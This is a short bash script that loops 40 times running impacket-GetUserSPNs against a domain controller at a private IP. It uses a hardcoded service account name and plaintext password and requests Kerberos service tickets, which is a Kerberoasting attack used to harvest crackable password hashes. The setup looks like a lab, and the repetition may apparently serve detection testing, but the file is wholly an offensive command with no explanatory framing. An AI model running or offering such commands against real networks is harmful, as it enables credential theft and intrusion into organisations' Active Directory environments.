#!/bin/bash

for i in  {1..40}
do
    /usr/bin/impacket-GetUserSPNs  my.domain.local/svc_sql:P@ssw0rd123! -dc-ip 192.168.198.135 -request
done
